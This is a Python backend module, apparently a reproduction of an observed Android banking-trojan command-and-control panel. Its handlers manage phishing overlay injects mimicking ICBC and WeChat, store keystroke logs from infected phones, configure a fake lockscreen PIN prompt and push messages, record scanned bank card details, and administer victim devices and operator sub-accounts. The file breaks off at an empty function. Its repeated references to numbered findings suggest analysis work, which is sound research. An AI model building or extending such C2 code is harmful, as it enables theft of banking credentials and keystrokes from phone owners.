#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""· 业务面真逻辑（统一接口）
统一签名： fn(body: dict, query: dict, actor: str) -> dict
注册表： HANDLERS[path][method] = fn
存储：内存 + 落盘 repro/state/store.json（写失败自动降级为纯内存）
设备数据由 refc2 在挂载时注入： set_device_provider(fn)
"""
import json, os, secrets, time
import re
import base64
import hashlib
import shutil
import subprocess
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
# 存储路径可被 REFC2_STORE 覆盖：闸门用独立临时库跑，避免互相污染（默认仍是 repro/state/store.json）
STORE = os.environ.get('REFC2_STORE') or os.path.join(HERE, '..', 'state', 'store.json')

_D = None            # 设备提供者： () -> [{deviceId, online, lastSeen, shots, caps, ...}]
_DEL = None          # 设备删除器： (deviceId) -> bool（由 refc2 注入）


def set_device_provider(fn):
    global _D
    _D = fn


def set_device_deleter(fn):
    """注入"真删设备"的能力（内存 + DB）；cleanup / clean 用它，否则只能假装删掉（见 F-72）"""
    global _DEL
    _DEL = fn


def delete_device(device_id):
    try:
        return bool(_DEL(device_id)) if _DEL else False
    except Exception:
        return False


def devices():
    try:
        return list(_D()) if _D else []
    except Exception:
        return []


def device(device_id):
    for d in devices():
        if d.get('deviceId') == device_id:
            return d
    return None


S = {
    'inject_settings': [], 'inj_records': [], 'inj_track': {}, 'keylogs': [], 'lockscreen':
    {'enabled': False, 'title': '', 'disclaimer': '', 'pin_length': 6, 'langs': []},
    'push_config': {'enabled': False, 'title': '', 'body': '', 'url': ''}, 'banners': [],
    'memos': [], 'groups': [], 'blacklist': [], 'notes': {}, 'marks': {}, 'pins': {},
    'users': [{'username': 'admin', 'role': 'admin', 'apkId': '10020', 'childUsers': [],
               'created': 0}],
    'audit': [], 'transfers': [], 'builds': [], 'build_profiles': [
        {'id': 'default', 'name': '默认构建', 'apkId': '10020', 'group': '', 'note': ''}],
    'ai_config': {'enabled': False, 'provider': 'none', 'model': '', 'note': '默认关闭（fail-safe）'},
    'ai_tasks': [], 'translate_config': {'enabled': False, 'from': 'zh', 'to': 'en'},
    'bank_cards': [], 'cache': {}, 'setup_history': [], 'clean_log': [], 'licenses': [],
    'tg': {'bound': False, 'chat_id': ''}, 'list_load_settings': {'enabled': False, 'threshold': 3},
    'announcements': [{'id': 'a1', 'ts': 0, 'title': '本地实现就绪', 'body': 'C2'}],
    'daily_report': {}, 'argv': {}, 'flags': {}, 'misc': {},
}
_loaded = False


def _valid_dev_id(v):
    """设备 id 的合法性判据：4~64 个字符，且不是 null/undefined/None 这类空值字面量。

    只用 `len >= 4` 不够 —— 畸形输入实测留下了 `'null'` 这种键和 2000 个 x 的超长键，
    它们会一直躺在标记/固定/备注里污染读出的结构（见 F-73 续）。"""
    if not isinstance(v, str):
        return False
    s = v.strip()
    if not (4 <= len(s) <= 64):
        return False
    return s.lower() not in ('null', 'none', 'undefined', 'false', 'true', 'nan')


def load():
    global _loaded
    if _loaded:
        return
    try:
        if os.path.exists(STORE):
            with open(STORE, encoding='utf-8') as fh:
                S.update(json.load(fh))
    except Exception as e:
        print('[api_impl] 存储读取失败，降级内存：%s' % e)
    # 自愈：清掉历史脏数据（畸形输入曾把 deviceIds 字符串按字符写进黑名单/标记，见 F-73）
    try:
        S['blacklist'] = [x for x in (S.get('blacklist') or []) if _valid_dev_id(x)]
        S['marks'] = {k: v for k, v in (S.get('marks') or {}).items() if _valid_dev_id(k)}
        S['pins'] = {k: v for k, v in (S.get('pins') or {}).items() if _valid_dev_id(k)}
        S['notes'] = {k: v for k, v in (S.get('notes') or {}).items() if _valid_dev_id(k)}
        for _d in ('inj_track',):
            S[_d] = {k: v for k, v in (S.get(_d) or {}).items() if _valid_dev_id(k)}
        # 配置层归一：布尔键强制真布尔、未知键丢弃（'yes'/'deviceId' 之类的脏值不再留在配置里）
        for _n in _CONFIG_SCHEMA:
            if isinstance(S.get(_n), dict):
                S[_n] = _norm_cfg(_n)
        # 列表型字段归一：分组的 deviceIds、公告的 targets 必须是真列表，不能是字符串
        S['groups'] = [dict(g, deviceIds=_as_list(g.get('deviceIds')))
                       for g in (S.get('groups') or []) if isinstance(g, dict)]
        S['banners'] = [dict(x, targets=_as_list(x.get('targets')))
                        for x in (S.get('banners') or []) if isinstance(x, dict)]
    except Exception:
        pass
    _loaded = True


def save():
    try:
        os.makedirs(os.path.dirname(STORE), exist_ok=True)
        with open(STORE, 'w', encoding='utf-8') as fh:
            json.dump(S, fh, ensure_ascii=False, indent=1)
    except Exception as e:
        print('[api_impl] 存储写入失败（内存态继续）：%s' % e)


def audit(actor, action, detail=''):
    S['audit'].append({'ts': int(time.time()), 'actor': actor, 'action': action, 'detail': str(detail)[:200]})
    S['audit'] = S['audit'][-1000:]


def now():
    return int(time.time())


# ============================ 数据层接入（有 DB 用 DB，无则回落内存） ============================
_DB = None


def db():
    global _DB
    if _DB is None:
        try:
            import os as _os, sys as _sys
            _sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
            import db as _dbmod
            _DB = _dbmod.get()
        except Exception as e:
            print('[api_impl] 数据层不可用，使用内存存储：%s' % e)
            _DB = False
    return _DB if _DB else None


# ============================ 注入面 ============================
def h_inject_list(b, q, a):
    d = db()
    if d:
        rows = d.inject_list()
        for r in rows:
            r['fullscreen'] = bool(r.get('fullscreen'))
            r['enabled'] = bool(r.get('enabled'))
        return {'ok': True, 'items': rows, 'store': 'sqlite'}
    return {'ok': True, 'items': S['inject_settings'], 'store': 'memory'}


def _inject_norm(b):
    """前端字段是驼峰（packageName/appName/templateUrl），早期实现只读下划线 → 新增的配置列表里查不到"""
    def pick(*names, default=''):
        for n in names:
            if n in b and b[n] is not None:
                return b[n]
        return default
    return {
        'package_name': pick('packageName', 'package_name', 'pkg'),
        'app_name': pick('appName', 'app_name', 'title'),
        'template_url': pick('templateUrl', 'template_url'),
        'category': pick('category', 'type'),
        'country': pick('country'),
        'fullscreen': bool(pick('fullscreen', default=False)),
        'enabled': b.get('enabled', True) is not False,
    }


def h_inject_list(b, q, a):
    rows = []
    d = db()
    if d:
        rows = d.inject_list()
        for r in rows:
            r['fullscreen'] = bool(r.get('fullscreen'))
            r['enabled'] = bool(r.get('enabled'))
    if not rows:
        rows = S['inject_settings']
    # 前端字段是驼峰/下划线混用，两种都给出，避免"新增了但列表读不到"
    for r in rows:
        r.setdefault('pkg', r.get('package_name', ''))
        r.setdefault('packageName', r.get('package_name', ''))
        r.setdefault('appName', r.get('app_name', ''))
        r.setdefault('title', r.get('app_name', ''))
        r.setdefault('templateUrl', r.get('template_url', ''))
    # 前端读 settings（也保留 items 兼容）
    return {'ok': True, 'items': rows, 'settings': rows,
            'store': 'sqlite' if d else 'memory'}


def h_inject_add(b, q, a):
    n = _inject_norm(b)
    # 服务端也要校验必填项（前端会拦，但 API 直调不能凭空建空配置，见 F-68）
    if not str(n['package_name'] or '').strip():
        return {'ok': False, 'error': '应用包名不能为空'}
    if len(str(n['package_name'])) > 120:
        return {'ok': False, 'error': '包名过长'}
    if not str(n['app_name'] or '').strip():
        return {'ok': False, 'error': '应用名称不能为空'}
    it = {'id': secrets.token_hex(6), 'package_name': n['package_name'],
          'app_name': n['app_name'], 'template_url': n['template_url'],
          'fullscreen': n['fullscreen'], 'country': n['country'],
          'category': n['category'], 'enabled': n['enabled'], 'logo': '', 'created': now()}
    d = db()
    if d:
        d.inject_add(it)
        d.audit(a, 'inject_add', it['package_name'])
    S['inject_settings'].append(it)          # 内存同写，保证列表立刻可见（DB 与内存一致）
    audit(a, 'inject_add', it['package_name'])
    save()
    return {'ok': True, 'item': it, 'store': 'sqlite' if d else 'memory'}


def h_inject_update(b, q, a):
    iid = q.get('id') or b.get('id')
    # 前端可能用 packageName/appName/title/pkg 任一写法（早期判断里漏了 title/pkg → 改了不生效，见 F-67）
    norm_keys = ('packageName', 'package_name', 'pkg', 'appName', 'app_name', 'title',
                 'templateUrl', 'template_url', 'category', 'country', 'fullscreen', 'enabled')
    n = _inject_norm(b) if any(k in b for k in norm_keys) else {}
    for it in S['inject_settings']:
        if it['id'] == iid:
            for k, v in n.items():
                if v not in ('', None) or k == 'enabled':
                    it[k] = v
            for k in ('fullscreen', 'enabled'):
                if k in b:
                    it[k] = bool(b[k])
            d = db()
            if d:
                try:
                    d.inject_update(iid, it)
                except Exception:
                    pass
            audit(a, 'inject_update', iid)
            save()
            return {'ok': True, 'item': it}
    return {'ok': False, 'error': 'not found'}


def h_inject_del(b, q, a):
    iid = q.get('id') or b.get('id')
    n = len(S['inject_settings'])
    S['inject_settings'] = [i for i in S['inject_settings'] if i['id'] != iid]
    # DB 也要删：列表优先读 DB，只删内存会让配置"删了还在"（见 F-67）
    d = db()
    if d:
        try:
            d.inject_delete(iid)
        except Exception:
            pass
    audit(a, 'inject_delete', str(iid))
    save()
    return {'ok': True, 'deleted': True, 'id': iid}


def h_inject_logo(b, q, a):
    """图标/Logo 上传（接受 base64，落盘名登记）"""
    data = b.get('logo') or b.get('data') or ''
    iid = q.get('id') or b.get('id')
    for it in S['inject_settings']:
        if it['id'] == iid:
            it['logo'] = ('data-uri:%d bytes' % len(data)) if data else ''
            save()
            return {'ok': True, 'id': iid, 'logo': it['logo']}
    return {'ok': False, 'error': 'not found'}


def h_inject_html(b, q, a):
    """按 __BK 契约渲染（真模板 + 真配置）"""
    iid = q.get('id') or b.get('id')
    html = render_inject(iid)
    if not html:
        return {'ok': False, 'error': 'not found'}
    return {'ok': True, 'html': html, 'bytes': len(html)}


def h_inj_templates(b, q, a):
    return {'ok': True, 'templates': [
        {'id': 1, 'name': '中国工商银行', 'file': 'materials/inject/inject_id1_icbc.html',
         'evidence': 'observed', 'cc': 'custom', 'api': '/api/EaodBankInject.php'},
        {'id': 2, 'name': '微信', 'file': 'materials/inject/inject_id2_wechat.html',
         'evidence': 'observed', 'cc': 'custom', 'api': '/api/EaodBankInject.php'}]}


def h_inj_records(b, q, a):
    return {'ok': True, 'records': S['inj_records'][-200:]}


def h_inj_count_batch(b, q, a):
    # 面板两种调用方式都有：GET（列表页轮询）/ POST（勾选后批量查）
    ids = b.get('deviceIds') or q.get('deviceIds') or []
    if isinstance(ids, str):
        ids = [x for x in ids.split(',') if x]
    if not ids:
        ids = [d.get('deviceId') for d in devices() if d.get('deviceId')]
    out = {d: len([r for r in S['inj_records'] if r.get('deviceId') == d]) for d in ids}
    return {'ok': True, 'counts': out}


def h_inj_track(b, q, a):
    d = b.get('deviceId') or q.get('deviceId')
    return {'ok': True, 'track': S['inj_track'].get(d, {'state': 'idle'})}


def h_inj_track_act(b, q, a):
    d = b.get('deviceId') or q.get('deviceId')
    act = q.get('_act') or b.get('_act') or 'inject'
    st = {'inject': 'injected', 'reset': 'idle', 'skip': 'skipped'}.get(act, act)
    S['inj_track'][d] = {'state': st, 'ts': now()}
    if act == 'inject':
        S['inj_records'].append({'ts': now(), 'deviceId': d, 'package': b.get('package_name', ''),
                                 'app': b.get('app_name', ''), 'enabled': True})
    save()
    return {'ok': True, 'deviceId': d, 'state': st}


def h_inject_cancel(b, q, a):
    d = b.get('deviceId') or q.get('deviceId')
    S['inj_track'][d] = {'state': 'cancelled', 'ts': now()}
    save()
    return {'ok': True, 'deviceId': d, 'state': 'cancelled'}


def h_custom_inject(b, q, a):
    if b:
        S['misc']['custom_inject'] = b
        save()
    return {'ok': True, 'custom': S['misc'].get('custom_inject', {})}


def h_popup_inject(b, q, a):
    if b:
        S['misc']['popup_inject'] = b
        save()
    return {'ok': True, 'popup': S['misc'].get('popup_inject', {})}


# ============================ 键盘/锁屏/推送 ============================
def h_keylogs_list(b, q, a):
    d = db()
    if d:
        return {'ok': True, 'list': d.keylogs(q.get('deviceId'), int(q.get('limit', 200))),
                'store': 'sqlite'}
    dev = q.get('deviceId')
    rows = [k for k in S['keylogs'] if not dev or k['deviceId'] == dev]
    return {'ok': True, 'list': rows[-int(q.get('limit', 200)):], 'store': 'memory'}


def h_keylogs_add(b, q, a):
    d = db()
    if d:
        d.keylog_add({'deviceId': b.get('deviceId'), 'pkg': b.get('pkg'), 'type': b.get('type'),
                      'text': b.get('text')})
        return {'ok': True, 'count': len(d.keylogs()), 'store': 'sqlite'}
    S['keylogs'].append({'deviceId': b.get('deviceId'), 'pkg': b.get('pkg'), 'type': b.get('type'),
                         'text': b.get('text'), 'ts': now()})
    save()
    return {'ok': True, 'count': len(S['keylogs']), 'store': 'memory'}


def h_lock_get(b, q, a):
    return {'ok': True, 'config': S['lockscreen']}


def h_lock_set(b, q, a):
    S['lockscreen'] = _norm_cfg('lockscreen', b)
    save()
    return {'ok': True, 'config': S['lockscreen']}


def h_push_get(b, q, a):
    return {'ok': True, 'config': S['push_config']}


def h_push_set(b, q, a):
    S['push_config'] = _norm_cfg('push_config', b)
    save()
    return {'ok': True, 'config': S['push_config']}


def h_banner(b, q, a):
    bn = {'ts': now(), 'title': b.get('title', ''), 'body': b.get('body', ''),
          'url': b.get('url', ''), 'targets': _as_list(b.get('deviceIds'))}
    S['banners'].append(bn)
    save()
    return {'ok': True, 'banner': bn}


# ============================ 设备数据面 ============================
def h_devices(b, q, a):
    return {'ok': True, 'devices': devices(), 'rev': len(devices())}


def h_devices_delta(b, q, a):
    since = int(q.get('since', 0) or 0)
    rows = devices()
    return {'ok': True, 'rev': len(rows), 'updated': rows[since:] if since < len(rows) else [],
            'went_offline': [], 'full_reload': False}


def h_device_one(b, q, a):
    # 原版控制页读的是扁平对象：/api/device?id=<deviceId> —— deviceId/id/device_id 三个键都收
    did = (q.get('id') or q.get('deviceId') or q.get('device_id')
           or b.get('id') or b.get('deviceId') or b.get('device_id'))
    d = device(did)
    if not d:
        return {'ok': False, 'error': 'not_found', 'deviceId': did}
    out = dict(d)
    out['ok'] = True
    return out


def h_device_cache(b, q, a):
    d = q.get('deviceId')
    if b and d:
        S['cache'][d] = b
        save()
    return {'ok': True, 'cache': S['cache'].get(d, {})}


def h_device_analysis(b, q, a):
    d = q.get('deviceId') or b.get('deviceId')
    dev = device(d) or {}
    return {'ok': True, 'deviceId': d, 'analysis': {
        'caps': dev.get('caps', []), 'shots': dev.get('shots', 0),
        'risk': 'unknown', 'note': '分析规则待补（契约已登记）'}}


def h_ai_history(b, q, a):
    d = q.get('deviceId')
    rows = [t for t in S['ai_tasks'] if not d or t.get('deviceId') == d]
    return {'ok': True, 'list': rows[-100:]}


def h_setup_history(b, q, a):
    d = q.get('deviceId')
    rows = [r for r in S['setup_history'] if not d or r.get('deviceId') == d]
    return {'ok': True, 'list': rows[-100:]}


def h_trigger_setup(b, q, a):
    r = {'ts': now(), 'deviceId': b.get('deviceId'), 'profile': b.get('profile', 'default')}
    S['setup_history'].append(r)
    save()
    return {'ok': True, 'setup': r}


def h_memo_list(b, q, a):
    d = q.get('deviceId') or b.get('deviceId')
    rows = [m for m in S['memos'] if not d or m['deviceId'] == d]
    # 前端读的是 memos 键、元素用 content/tag（早期只给 list+text，备忘录页永远空白）
    return {'ok': True, 'list': rows, 'memos': rows}


def h_memo_add(b, q, a):
    dev = b.get('deviceId')
    txt = b.get('content')
    if txt is None:
        txt = b.get('text', '')
    if not dev or not isinstance(dev, str) or len(dev) > 128:
        return {'ok': False, 'error': 'deviceId 非法或缺失'}
    if not isinstance(txt, str) or not txt.strip():
        return {'ok': False, 'error': '内容不能为空'}
    if len(txt) > 2000:
        return {'ok': False, 'error': '内容过长（上限 2000 字符）'}
    m = {'id': secrets.token_hex(4), 'deviceId': dev, 'content': txt,
         'text': txt, 'tag': str(b.get('tag') or '')[:16], 'ts': now()}
    S['memos'].append(m)
    save()
    return {'ok': True, 'memo': m}


def h_memo_search(b, q, a):
    kw = (q.get('q') or b.get('q') or '').lower()
    rows = [m for m in S['memos']
            if kw in (m.get('content') or m.get('text') or '').lower()
            or kw in (m.get('tag') or '').lower()]
    return {'ok': True, 'list': rows, 'memos': rows,
            'deviceIds': sorted({m.get('deviceId') for m in rows if m.get('deviceId')})}


def h_memo_update(b, q, a):
    for m in S['memos']:
        if m['id'] == (q.get('id') or b.get('id')):
            txt = b.get('content')
            if txt is None:
                txt = b.get('text')
            if txt is not None:
                m['content'] = txt
                m['text'] = txt
            if 'tag' in b:
                m['tag'] = b.get('tag')
            save()
            return {'ok': True, 'memo': m}
    return {'ok': False, 'error': 'not found'}


def h_memo_del(b, q, a):
    mid = q.get('id') or b.get('id')
    n = len(S['memos'])
    S['memos'] = [m for m in S['memos'] if m['id'] != mid]
    del_ok = len(S['memos']) != n
    save()
    # 删不存在的对象必须明确失败（早期一律回 ok:true，见 F-68）
    return {'ok': del_ok, 'error': None if del_ok else '备忘录不存在', 'id': mid}


def h_memo_counts(b, q, a):
    out = {}
    for m in S['memos']:
        out[m['deviceId']] = out.get(m['deviceId'], 0) + 1
    return {'ok': True, 'counts': out}


def h_groups(b, q, a):
    return {'ok': True, 'groups': S['groups']}


def h_group_upsert(b, q, a):
    gid = b.get('id') or q.get('id')
    # deviceIds 归一成真列表：字符串会按逗号切（不能直接遍历字符串，否则 "notalist" 变 8 个单字符 id，见 F-73）
    patch = {k: b[k] for k in ('name', 'color') if k in b}
    if 'deviceIds' in b:
        patch['deviceIds'] = _as_list(b.get('deviceIds'))
    for g in S['groups']:
        if g['id'] == gid:
            g.update(patch)
            save()
            return {'ok': True, 'group': g}
    # 带 id 的更新请求：目标不存在就该 404，不能凭空建一个同 id 的分组（见 F-68）
    if gid and str(b.get('_upsert') or '') != '1':
        return {'ok': False, 'error': '分组不存在', 'id': gid}
    g = {'id': gid or secrets.token_hex(4), 'name': str(b.get('name', ''))[:64],
         'color': str(b.get('color', ''))[:32], 'deviceIds': patch.get('deviceIds', [])}
    S['groups'].append(g)
    save()
    return {'ok': True, 'group': g}


def h_group_del(b, q, a):
    """删除分组（前端用 DELETE + body {id}；早期只挂了 GET/POST/PUT，DELETE 落到 405/404）"""
    gid = b.get('id') or q.get('id')
    n = len(S['groups'])
    S['groups'] = [g for g in S['groups'] if g.get('id') != gid]
    save()
    audit(a, 'group_delete', str(gid))
    return {'ok': len(S['groups']) != n, 'id': gid}


def h_clean(b, q, a):
    """按原版语义真删：只删「当前账号自己归属」且「清理时仍离线」的设备，其余跳过。
    前端确认文案即此规则；早期实现只写了一条 clean_log、什么都没删（见 F-72）。"""
    ids = _as_list(b.get('deviceIds') or b.get('device_ids'))
    by_id = {d.get('deviceId'): d for d in devices()}
    count, skipped, deleted = 0, 0, []
    for d in ids:
        row = by_id.get(d)
        if not row or row.get('online'):
            skipped += 1
            continue
        owner = row.get('assigned_to') or 'admin'
        if owner not in ('', 'admin', a or 'admin'):
            skipped += 1
            continue
        if delete_device(d):
            count += 1
            deleted.append(d)
        else:
            skipped += 1
    S['clean_log'].append({'ts': now(), 'action': b.get('action', 'clean'), 'deviceIds': deleted,
                           'count': count, 'skipped': skipped, 'actor': a})
    save()
    audit(a, 'device_clean', 'deleted=%d skipped=%d' % (count, skipped))
    return {'ok': True, 'count': count, 'skipped': skipped, 'deleted': deleted}


def h_cleanup_offline(b, q, a):
    """清理离线：真删（内存 + DB），返回实际删除数与 id 列表"""
    off = [d.get('deviceId') for d in devices() if not d.get('online')]
    deleted = [d for d in off if delete_device(d)]
    S['clean_log'].append({'ts': now(), 'action': 'cleanup_offline', 'deviceIds': deleted,
                           'count': len(deleted), 'actor': a})
    save()
    audit(a, 'cleanup_offline', 'deleted=%d' % len(deleted))
    return {'ok': True, 'removed': len(deleted), 'count': len(deleted),
            'deviceIds': deleted, 'skipped': len(off) - len(deleted)}


def h_offline_analysis(b, q, a):
    off = [d for d in devices() if not d.get('online')]
    return {'ok': True, 'offline': len(off), 'list': off}


def h_mark(b, q, a):
    ids = _as_list(b.get('deviceIds') or b.get('device_ids') or b.get('deviceId'))
    mark = b.get('mark')
    if mark is None:
        mark = b.get('color')
    for d in ids:
        if not _valid_dev_id(d):
            continue
        if mark in (None, '', 'none', 'clear'):
            S['marks'].pop(d, None)
        else:
            S['marks'][d] = str(mark)[:32]
    save()
    return {'ok': True, 'count': len(ids), 'mark': mark}


def h_pin(b, q, a):
    d = b.get('deviceId') or q.get('deviceId')
    # 前端传 pinned（{deviceId, pinned}）；早期只读 pin，导致"取消置顶"永远无效
    val = b.get('pinned')
    if val is None:
        val = b.get('pin')
    if val is None:
        val = True
    if not _valid_dev_id(d):
        return {'ok': False, 'error': 'invalid deviceId', 'deviceId': d}
    S['pins'][d] = bool(val)
    save()
    return {'ok': True, 'deviceId': d, 'pinned': S['pins'][d], 'pin': S['pins'][d]}


def h_note(b, q, a):
    d = b.get('deviceId')
    if not _valid_dev_id(d):
        return {'ok': False, 'error': 'deviceId 非法或过长'}
    note = b.get('note', '')
    if not isinstance(note, str) or len(note) > 2000:
        return {'ok': False, 'error': '备注过长（上限 2000 字符）'}
    S['notes'][d] = note
    save()
    return {'ok': True, 'note': note}


def _as_list(v, maxn=1000):
    """把"类数组"参数归一成字符串列表。
    字符串会被逗号切分——**绝不能直接遍历字符串**，否则 "notalist" 会变成 n/o/t/a/l/i/s/t
    八条设备 id（畸形输入扫描时实测把黑名单塞满了单字符，见 F-73）。"""
    if v is None:
        return []
    if isinstance(v, (list, tuple, set)):
        out = [str(x) for x in v if isinstance(x, (str, int, float)) and str(x).strip()]
    elif isinstance(v, str):
        out = [x.strip() for x in v.split(',') if x.strip()]
    elif isinstance(v, (int, float)):
        out = [str(v)]
    else:
        out = []
    return out[:maxn]


def h_blacklist(b, q, a):
    if b:
        enable = _as_bool(b.get('enable', True), True)
        for d in _as_list(b.get('deviceIds') or b.get('deviceId')):
            if len(d) < 4:               # 明显不是设备 id，丢弃（防脏数据入库）
                continue
            if enable and d not in S['blacklist']:
                S['blacklist'].append(d)
            elif not enable and d in S['blacklist']:
                S['blacklist'].remove(d)
        save()
        audit(a, 'blacklist', 'enable=%s n=%d' % (enable, len(_as_list(b.get('deviceIds')))))
    return {'ok': True, 'list': S['blacklist'], 'total': len(S['blacklist'])}


def h_transfer(b, q, a):
    ids = _as_list(b.get('deviceIds') or b.get('deviceId'))
    t = {'ts': now(), 'deviceIds': ids, 'targetUser': str(b.get('targetUser') or '')[:64]}
    S['transfers'].append(t)
    audit(a, 'transfer', t['targetUser'])
    save()
    return {'ok': True, 'transfer': t}


def h_transfer_targets(b, q, a):
    return {'ok': True, 'targets': [u['username'] for u in S['users']]}


def h_users(b, q, a):
    rows = []
    for u in S['users']:
        rows.append({k: v for k, v in u.items() if k not in ('pw',)})
    return {'ok': True, 'users': rows, 'list': rows}


def h_users_add(b, q, a):
    """新增子账号：写用户记录 + **写密码哈希**（否则子账号根本登录不了，见 F-68）"""
    name = str(b.get('username') or '').strip()
    pwd = b.get('password') or b.get('passwd') or ''
    if not name:
        return {'ok': False, 'error': '请输入账号名'}
    if len(name) > 64:
        return {'ok': False, 'error': '账号名过长'}
    if not pwd or len(str(pwd)) < 6:
        return {'ok': False, 'error': '初始密码至少 6 位'}
    if any(u.get('username') == name for u in S['users']):
        return {'ok': False, 'error': '账号已存在'}
    role = str(b.get('role') or 'user')
    u = {'username': name, 'role': role, 'apkId': b.get('apkId') or '10020',
         'childUsers': [], 'created': now(), 'expireAt': int(b.get('expireAt') or 0)}
    S['users'].append(u)
    salt = secrets.token_hex(8)
    h = hashlib.sha256((salt + str(pwd)).encode()).hexdigest()
    d = db()
    if d:
        try:
            d.kv_set('pw_%s' % name, '%s$%s' % (salt, h))
            d.ensure_user(name, role, u['apkId'])
        except Exception:
            pass
    audit(a, 'user_add', name)
    save()
    return {'ok': True, 'user': u}


def h_users_update(b, q, a):
    name = str(b.get('username') or q.get('username') or '')
    u = next((x for x in S['users'] if x.get('username') == name), None)
    if not u:
        return {'ok': False, 'error': '账号不存在'}
    if 'role' in b:
        u['role'] = str(b['role'])
    if 'expireAt' in b:
        u['expireAt'] = int(b.get('expireAt') or 0)
    if b.get('password'):
        if len(str(b['password'])) < 6:
            return {'ok': False, 'error': '新密码至少 6 位'}
        salt = secrets.token_hex(8)
        h = hashlib.sha256((salt + str(b['password'])).encode()).hexdigest()
        d = db()
        if d:
            d.kv_set('pw_%s' % name, '%s$%s' % (salt, h))
    audit(a, 'user_update', name)
    save()
    return {'ok': True, 'user': {k: v for k, v in u.items() if k != 'pw'}}


def h_users_del(b, q, a):
    name = str(b.get('username') or q.get('username') or '')
    if name == (a or 'admin'):
        return {'ok': False, 'error': '不能删除当前登录账号'}
    n = len(S['users'])
    S['users'] = [u for u in S['users'] if u.get('username') != name]
    d = db()
    if d:
        try:
            d.x('DELETE FROM users WHERE username=?', (name,))
        except Exception:
            pass
    audit(a, 'user_delete', name)
    save()
    return {'ok': len(S['users']) != n, 'error': None if len(S['users']) != n else '账号不存在'}


def h_me(b, q, a):
    u = S['users'][0]
    return {'ok': True, 'username': a or u['username'], 'role': u['role'], 'apkId': u.get('apkId'),
            'childUsers': u.get('childUsers', []), 'expireAt': 0, 'parent': ''}


def h_me_password(b, q, a):
    """真改密：校验旧密码 → 写哈希到 DB（登录时优先校验 DB 密码）→ 审计。

    防自锁：主账号的**初始**口令仍来自环境变量，DB 哈希只在存在时覆盖校验，
    因此改密真实生效且不会把自己锁在外面（忘掉可用环境变量口令登录）。"""
    old = b.get('oldPassword') or b.get('old_password') or ''
    new = b.get('newPassword') or b.get('new_password') or ''
    user = b.get('username') or a or 'admin'
    if not old:
        return {'ok': False, 'error': '请输入旧密码'}
    if not new or len(new) < 4:
        return {'ok': False, 'error': '新密码至少 4 位'}
    d = db()
    stored = d.kv_get('pw_%s' % user) if d else None
    if stored:
        salt, h = stored.split('$', 1)
        import hashlib as _h
        if _h.sha256((salt + old).encode()).hexdigest() != h:
            return {'ok': False, 'error': '旧密码错误'}
    else:
        import os as _os
        if old != _os.environ.get('REFC2_PASS', ''):
            return {'ok': False, 'error': '旧密码错误'}
    import hashlib as _h
    salt = secrets.token_hex(8)
    if d:
        d.kv_set('pw_%s' % user, '%s$%s' % (salt, _h.sha256((salt + new).encode()).hexdigest()))
    S.setdefault('pw_changes', []).append({'ts': now(), 'user': user})
    audit(a, 'password_change', user)
    save()
    return {'ok': True, 'user': user}


def h_reauth(b, q, a):
    return {'ok': True, 'reauthToken': secrets.token_urlsafe(16)}


def h_ws_ticket(b, q, a):
    """面板实时通道票据（原实现：POST /api/ws-ticket -> {ok,ticket}）"""
    t = secrets.token_urlsafe(24)
    S['flags'].setdefault('ws_tickets', {})[t] = {'actor': a, 'ts': now()}
    save()
    return {'ok': True, 'ticket': t}


def h_audit(b, q, a):
    d = db()
    if d:
        return {'ok': True, 'list': d.audits(int(q.get('limit', 200))), 'store': 'sqlite'}
    return {'ok': True, 'list': S['audit'][-int(q.get('limit', 200)):], 'store': 'memory'}


def h_db_stats(b, q, a):
    """数据层自检：表清单 + 各表行数（证明是真库，不是内存态）"""
    d = db()
    if not d:
        return {'ok': False, 'error': 'db unavailable'}
    tables = [r['name'] for r in d.q(
        "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")]
    counts = {}
    for t in tables:
        if t == 'sqlite_sequence':
            continue
        r = d.q("SELECT COUNT(*) c FROM %s" % t)
        counts[t] = r[0]['c'] if r else 0
    return {'ok': True, 'path': d.path, 'tables': len(tables), 'counts': counts}


def h_announcements(b, q, a):
    return {'ok': True, 'list': S['announcements']}


def h_daily_report(b, q, a):
    d = devices()
    return {'ok': True, 'report': {'date': time.strftime('%Y-%m-%d'), 'devices': len(d),
                                   'online': len([x for x in d if x.get('online')]),
                                   'keylogs': len(S['keylogs']), 'injections': len(S['inj_records'])}}


def h_bank_cards(b, q, a):
    return {'ok': True, 'list': S['bank_cards']}


def h_bank_card_scan(b, q, a):
    if b:
        S['bank_cards'].append({'ts': now(), 'deviceId': b.get('deviceId'),
                                'bank': b.get('bank', ''), 'tail': b.get('tail', '')})
        save()
    return {'ok': True, 'count': len(S['bank_cards'])}


def h_analysis_batch(b, q, a):
    return {'ok': True, 'batch': {'total': len(devices()), 'done': len(devices()), 'pending': 0}}


def h_list_load_settings(b, q, a):
    if b:
        S['list_load_settings'] = _norm_cfg('list_load_settings', b)
        save()
    return {'ok': True, 'settings': S['list_load_settings']}


def h_applock(b, q, a):
    d = device(q.get('deviceId')) or {}
    return {'ok': True, 'deviceId': q.get('deviceId'), 'applock': d.get('applock', 'unknown')}


def h_adb_status(b, q, a):
    d = device(q.get('deviceId') or b.get('deviceId')) or {}
    return {'ok': True, 'status': {'type': 'adbStatus', 'connected': bool(d),
                                   'paired': bool(d), 'message': d.get('caps', [])}}


def h_icon_upload(b, q, a):
    """真保存上传的图标：接受 data-uri / base64，落盘到 state/uploads/icons/ 并返回可访问路径。
    （前端用 FormData 上传时由 refc2 的 multipart 分支处理）"""
    data = b.get('icon') or b.get('data') or ''
    if not data:
        return {'ok': True, 'icon': '', 'path': '', 'note': '未收到图标数据'}
    raw = None
    if isinstance(data, str) and data.startswith('data:'):
        try:
            raw = base64.b64decode(data.split(',', 1)[1])
        except Exception:
            raw = None
    elif isinstance(data, str) and len(data) > 64:
        try:
            raw = base64.b64decode(data)
        except Exception:
            raw = None
    if raw is None:
        return {'ok': False, 'error': '图标数据不是有效的 base64/data-uri'}
    import os as _os
    d = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), '..', 'state', 'uploads', 'icons')
    _os.makedirs(d, exist_ok=True)
    name = 'icon_%s_%d.png' % (secrets.token_hex(4), now())
    fp = _os.path.join(d, name)
    with open(fp, 'wb') as fh:
        fh.write(raw)
    path = '/user/storage/uploads/icons/%s' % name
    audit(a, 'icon_upload', '%s %dB' % (name, len(raw)))
    save()
    return {'ok': True, 'icon': path, 'path': path, 'bytes': len(raw)}


# ============================ 本轮补齐的剩余面 ============================
def h_ai_task_cancel(b, q, a):
